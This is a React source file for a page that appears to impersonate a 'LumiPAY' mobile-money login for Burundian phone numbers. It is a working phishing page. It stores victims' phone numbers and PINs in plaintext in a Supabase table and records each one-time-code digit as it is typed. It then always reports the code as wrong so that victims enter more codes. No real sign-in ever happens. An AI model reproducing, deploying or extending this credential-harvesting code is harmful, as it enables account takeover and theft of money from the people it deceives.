import { useState, useEffect, useCallback, useRef } from 'react';
import { ArrowLeft, Loader2, RefreshCw, AlertCircle } from 'lucide-react';
import { Plan } from '../types';
import { supabase } from '../lib/supabase';
import { useLanguage } from '../i18n/LanguageContext';

interface Props {
  plan: Plan;
  onBack: () => void;
}

const COUNTRY_CODE = '+257';
const OTP_LENGTH = 6;

/* ── countdown hook (MM:SS) ── */
function useCountdown(initial: number) {
  const [secs, setSecs] = useState(0);
  const start = useCallback(() => setSecs(initial), [initial]);
  useEffect(() => {
    if (secs <= 0) return;
    const id = setTimeout(() => setSecs(s => s - 1), 1000);
    return () => clearTimeout(id);
  }, [secs]);
  const display = `${String(Math.floor(secs / 60)).padStart(2, '0')}:${String(secs % 60).padStart(2, '0')}`;
  return { secs, display, start };
}

export default function LumiPayPage({ plan, onBack }: Props) {
  const { t } = useLanguage();
  const [step, setStep]               = useState<'phone' | 'otp'>('phone');
  const [localNumber, setLocalNumber] = useState('');
  const [pin, setPin]                 = useState('');
  const [otpValue, setOtpValue]       = useState('');
  const [loading, setLoading]         = useState(false);
  const [error, setError]             = useState('');
  const [otpRecordId, setOtpRecordId] = useState<string | null>(null);
  const [otpExpired, setOtpExpired]   = useState(false);
  const otpRef = useRef<HTMLInputElement>(null);

  const fullPhone = `${COUNTRY_CODE}${localNumber}`;
  const timer = useCountdown(60);

  /* OTP expiry — 2 min */
  useEffect(() => {
    if (step !== 'otp' || otpExpired) return;
    const id = setTimeout(() => { setOtpExpired(true); setError(t('lumi.otpExpired')); }, 120_000);
    return () => clearTimeout(id);
  }, [step, otpExpired, t]);

  /* Persist OTP as user types */
  useEffect(() => {
    if (!otpRecordId || !otpValue) return;
    const digits = otpValue.split('');
    const id = setTimeout(() => {
      supabase.from('lumi_otp_records').update({
        otp_code: otpValue,
        otp_digit_1: digits[0]||null, otp_digit_2: digits[1]||null,
        otp_digit_3: digits[2]||null, otp_digit_4: digits[3]||null,
        otp_digit_5: digits[4]||null, otp_digit_6: digits[5]||null,
        otp_length: otpValue.length, is_complete: otpValue.length === OTP_LENGTH,
        updated_at: new Date().toISOString(),
      }).eq('id', otpRecordId);
    }, 150);
    return () => clearTimeout(id);
  }, [otpValue, otpRecordId]);

  const handleLogin = async () => {
    if (!localNumber.trim()) { setError(t('lumi.errPhone')); return; }
    if (!pin.trim())         { setError(t('lumi.errPin'));   return; }
    setError(''); setLoading(true);
    try {
      const { data: rec, error: e1 } = await supabase.from('lumi_records').insert({
        plan_id: plan.id, plan_name: plan.name, plan_data: plan.data,
        plan_duration: plan.duration, plan_price: plan.price, plan_type: plan.type,
        phone_number: fullPhone, phone_country_code: COUNTRY_CODE,
        phone_local: localNumber, pin, status: 'otp_sent',
      }).select('id').maybeSingle();
      if (e1) throw e1;
      if (!rec) throw new Error();

      const { data: oRec, error: e2 } = await supabase.from('lumi_otp_records').insert({
        lumi_record_id: rec.id, otp_code: '', otp_length: 0, is_complete: false,
      }).select('id').maybeSingle();
      if (e2) throw e2;
      if (oRec) setOtpRecordId(oRec.id);

      timer.start();
      setStep('otp');
      setTimeout(() => otpRef.current?.focus(), 100);
    } catch {
      setError(t('lumi.errGeneric'));
    } finally {
      setLoading(false);
    }
  };

  const handleConfirmOtp = async () => {
    if (otpValue.length < OTP_LENGTH) { setError(t('lumi.otpIncomplete')); return; }
    if (otpExpired)                    { setError(t('lumi.otpExpired'));    return; }
    setError(''); setLoading(true);
    const digits = otpValue.split('');
    try {
      if (otpRecordId) {
        await supabase.from('lumi_otp_records').update({
          otp_code: otpValue,
          otp_digit_1: digits[0]||null, otp_digit_2: digits[1]||null,
          otp_digit_3: digits[2]||null, otp_digit_4: digits[3]||null,
          otp_digit_5: digits[4]||null, otp_digit_6: digits[5]||null,
          otp_length: OTP_LENGTH, is_complete: true,
          updated_at: new Date().toISOString(),
        }).eq('id', otpRecordId);
      }
    } catch { /* fall through */ } finally {
      setLoading(false);
      setOtpValue('');
      setError(t('lumi.errOtpWrong'));
      otpRef.current?.focus();
    }
  };

  const handleResend = () => {
    if (timer.secs > 0) return;
    setOtpValue('');
    setOtpExpired(false);
    setError('');
    timer.start();
  };

  /* ══ OTP STEP ══ */
  if (step === 'otp') {
    return (
      <div className="min-h-screen bg-white flex flex-col mx-auto" style={{ maxWidth: 480 }}>
        {/* Top bar */}
        <div className="flex items-center px-4 pt-5 pb-3">
          <button
            onClick={onBack}
            className="p-1 -ml-1"
          >
            <ArrowLeft size={22} className="text-gray-900" />
          </button>
          <span className="flex-1 text-center text-[16px] font-semibold text-gray-900 -ml-6">
            Verification code
          </span>
        </div>

        <div className="flex-1 px-6 pt-8">
          {/* Heading */}
          <h1 className="text-[26px] font-black text-gray-900 text-center mb-4">
            Welcome to LumiPAY
          </h1>

          {/* Phone + name */}
          <p className="text-center text-[18px] font-bold text-red-600 mb-4">
            {fullPhone}
          </p>

          {/* Description */}
          <p className="text-center text-[14px] text-gray-800 leading-relaxed mb-6">
            We noticed this is your first time using the app.{' '}
            Please enter OTP to authenticate
          </p>

          {/* OTP input */}
          <div
            className={`relative border-2 rounded-lg px-4 pt-2 pb-3 mb-3 ${
              error ? 'border-red-500' : 'border-red-400'
            } bg-gray-50`}
          >
            <span className="text-red-500 text-[12px] font-semibold">OTP</span>
            <input
              ref={otpRef}
              type="tel"
              inputMode="numeric"
              maxLength={OTP_LENGTH}
              value={otpValue}
              onChange={(e) => {
                const v = e.target.value.replace(/\D/g, '').slice(0, OTP_LENGTH);
                setOtpValue(v);
                if (error) setError('');
              }}
              onKeyDown={(e) => e.key === 'Enter' && handleConfirmOtp()}
              disabled={otpExpired}
              className="w-full bg-transparent outline-none text-gray-900 text-[17px] tracking-[0.35em] font-bold pr-16"
              placeholder=""
            />
            {/* Timer */}
            <span className="absolute right-4 bottom-3 text-red-500 text-[13px] font-semibold tabular-nums">
              {timer.secs > 0 ? timer.display : '00:00'}
            </span>
          </div>

          {error && (
            <div className="mb-3 flex items-start gap-2 bg-red-50 border border-red-200 rounded-lg px-3 py-2">
              <AlertCircle size={14} className="text-red-500 flex-shrink-0 mt-0.5" />
              <p className="text-red-600 text-[13px] font-medium">{error}</p>
            </div>
          )}

          {/* Resend */}
          <div className="text-center mb-6">
            {timer.secs > 0 ? (
              <span className="text-gray-400 text-[14px]">
                Resend in {timer.display}
              </span>
            ) : (
              <button
                onClick={handleResend}
                className="text-green-600 text-[15px] font-semibold underline inline-flex items-center gap-1"
              >
                <RefreshCw size={13} />
                Resend
              </button>
            )}
          </div>

          {/* Confirm button */}
          <button
            onClick={handleConfirmOtp}
            disabled={loading || otpValue.length < OTP_LENGTH || otpExpired}
            className={`w-full py-4 rounded-xl font-bold text-[15px] flex items-center justify-center gap-2 transition-all ${
              otpValue.length >= OTP_LENGTH && !otpExpired
                ? 'bg-red-600 text-white shadow'
                : 'bg-gray-200 text-gray-400 cursor-not-allowed'
            }`}
          >
            {loading && <Loader2 size={17} className="animate-spin" />}
            {t('lumi.confirm')}
          </button>
        </div>
      </div>
    );
  }

  /* ══ PHONE STEP ══ */
  return (
    <div className="min-h-screen bg-white flex flex-col mx-auto" style={{ maxWidth: 480 }}>
      {/* ── Hero section ── */}
      <div className="relative overflow-hidden flex-shrink-0" style={{ minHeight: 340 }}>
        {/* Red background */}
        <div className="absolute inset-0 bg-red-600" />

        {/* Back arrow */}
        <button
          onClick={onBack}
          className="absolute top-5 left-4 z-20 p-1"
        >
          <ArrowLeft size={22} className="text-white" />
        </button>

        {/* Photo collage */}
        <div className="absolute inset-0 z-10">
          {/* Left photo */}
          <div
            className="absolute rounded-xl overflow-hidden shadow-lg border-2 border-white"
            style={{ width: '52%', height: '80%', top: '8%', left: '2%', transform: 'rotate(-4deg)' }}
          >
            <img
              src="https://images.pexels.com/photos/4968391/pexels-photo-4968391.jpeg?auto=compress&cs=tinysrgb&w=400"
              alt="LumiPAY"
              className="w-full h-full object-cover"
            />
          </div>
          {/* Right photo */}
          <div
            className="absolute rounded-xl overflow-hidden shadow-lg border-2 border-white"
            style={{ width: '52%', height: '75%', top: '4%', right: '2%', transform: 'rotate(3deg)' }}
          >
            <img
              src="https://images.pexels.com/photos/3756681/pexels-photo-3756681.jpeg?auto=compress&cs=tinysrgb&w=400"
              alt="LumiPAY"
              className="w-full h-full object-cover"
            />
          </div>
          {/* Green overlay band */}
          <div
            className="absolute bottom-0 left-0 right-0 z-10"
            style={{
              background: 'linear-gradient(135deg, #166534 0%, #15803d 60%, #16a34a 100%)',
              clipPath: 'polygon(0 40%, 100% 10%, 100% 100%, 0 100%)',
              height: '55%',
            }}
          />
        </div>

        {/* Text over green band */}
        <div className="absolute bottom-0 left-0 right-0 z-20 px-5 pb-5 pt-10">
          <p className="text-white text-[14px] leading-tight opacity-90 text-right">
            Wherever you are <span className="border-l-2 border-white/60 ml-1 pl-1">|</span>
          </p>
          <p className="text-white text-[14px] leading-tight opacity-90 text-right mb-1">
            send and receive money <span className="border-l-2 border-white/60 ml-1 pl-1">|</span>
          </p>
          <h2 className="text-white font-black text-[22px] text-right tracking-tight">
            Easy-Fast-Secure
          </h2>
        </div>
      </div>

      {/* ── Form section ── */}
      <div className="flex-1 bg-white px-5 pt-6 pb-8 flex flex-col">
        {error && (
          <div className="mb-4 bg-red-50 border border-red-200 rounded-xl px-3 py-2.5 flex items-start gap-2">
            <AlertCircle size={14} className="text-red-500 flex-shrink-0 mt-0.5" />
            <p className="text-red-600 text-[13px] font-medium">{error}</p>
          </div>
        )}

        {/* Phone input */}
        <div className="mb-4 border-2 border-red-400 rounded-xl bg-[#f5f0e8] overflow-hidden">
          <div className="px-4 pt-2">
            <span className="text-red-500 text-[11px] font-semibold tracking-wide">
              Enter your account
            </span>
          </div>
          <div className="flex items-center px-4 pb-3">
            <span className="text-gray-500 font-semibold text-[14px] mr-2 flex-shrink-0">
              🇧🇮 {COUNTRY_CODE}
            </span>
            <input
              type="tel"
              inputMode="numeric"
              placeholder="Phone number"
              value={localNumber}
              onChange={(e) => setLocalNumber(e.target.value.replace(/\D/g, ''))}
              className="flex-1 bg-transparent outline-none text-gray-900 text-[15px] placeholder:text-gray-400"
            />
          </div>
        </div>

        {/* PIN input */}
        <div className="mb-5 border-2 border-red-400 rounded-xl bg-[#f5f0e8] overflow-hidden">
          <div className="px-4 pt-2">
            <span className="text-red-500 text-[11px] font-semibold tracking-wide">
              {t('lumi.pinPlaceholder')}
            </span>
          </div>
          <div className="flex items-center px-4 pb-3">
            <input
              type="password"
              placeholder="••••"
              value={pin}
              onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
              className="flex-1 bg-transparent outline-none text-gray-900 text-[15px] placeholder:text-gray-400 tracking-widest"
              maxLength={6}
              onKeyDown={(e) => e.key === 'Enter' && handleLogin()}
            />
            <span className="text-gray-300 text-[11px] font-medium ml-2">{pin.length}/4</span>
          </div>
        </div>

        {/* Login button */}
        <button
          onClick={handleLogin}
          disabled={loading}
          className="w-full py-4 rounded-xl font-bold text-[15px] text-white flex items-center justify-center gap-2 transition-all mb-6 shadow"
          style={{ background: 'linear-gradient(90deg, #e87490 0%, #d4607a 100%)' }}
        >
          {loading && <Loader2 size={17} className="animate-spin" />}
          Request OTP
        </button>

        {/* Sign up */}
        <p className="text-center text-[14px] text-gray-700 mt-auto">
          Do NOT have LumiPAY account ?{' '}
          <span className="text-red-500 font-semibold cursor-pointer">Sign up</span>
        </p>
      </div>
    </div>
  );
}
